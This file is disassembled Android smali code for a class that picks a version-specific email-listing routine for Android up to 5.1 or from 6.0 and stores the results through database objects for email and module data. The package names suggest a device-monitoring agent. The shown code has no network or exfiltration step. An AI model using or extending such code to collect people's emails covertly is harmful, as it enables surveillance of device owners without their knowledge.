.class public Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;
.super Ljava/lang/Object;
.source "MultiversionEmailLister.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "EmailMonitor::MutliversionEmailLister"


# instance fields
.field protected context:Landroid/content/Context;

.field protected emailDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EmailData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Landroid/content/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EmailData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            ")V"
        }
    .end annotation

    .line 29
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 15
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->context:Landroid/content/Context;

    .line 16
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->emailDao:Lcom/j256/ormlite/dao/Dao;

    .line 17
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 30
    iput-object p1, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->context:Landroid/content/Context;

    .line 31
    iput-object p2, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->emailDao:Lcom/j256/ormlite/dao/Dao;

    .line 32
    iput-object p3, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 34
    iput-object p4, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 35
    iput-object p5, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 42
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->runUnsafe()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 45
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::MutliversionEmailLister"

    const-string v3, "run(): Exception caught in runUnsafe()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return-void
.end method

.method protected runUnsafe()V
    .locals 9

    .line 52
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x16

    if-gt v0, v1, :cond_0

    .line 53
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "EmailMonitor::MutliversionEmailLister"

    const-string v2, "running on Android up to 5.1 (SDK 22)."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 55
    new-instance v0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->context:Landroid/content/Context;

    .line 56
    invoke-virtual {v1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    iget-object v5, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->emailDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->log:Lcom/hp/vd/agent/log/IWriter;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v8, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    move-object v3, v0

    invoke-direct/range {v3 .. v8}, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;-><init>(Landroid/content/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;)V

    .line 66
    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->run()V

    goto :goto_0

    .line 69
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "EmailMonitor::MutliversionEmailLister"

    const-string v2, "running on Android from 6.0 (SDK 23)."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 71
    new-instance v0, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->context:Landroid/content/Context;

    .line 72
    invoke-virtual {v1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    iget-object v5, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->emailDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->log:Lcom/hp/vd/agent/log/IWriter;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v8, p0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    move-object v3, v0

    invoke-direct/range {v3 .. v8}, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;-><init>(Landroid/content/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;)V

    .line 82
    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/email/EmailListerFrom60;->run()V

    :goto_0
    return-void
.end method
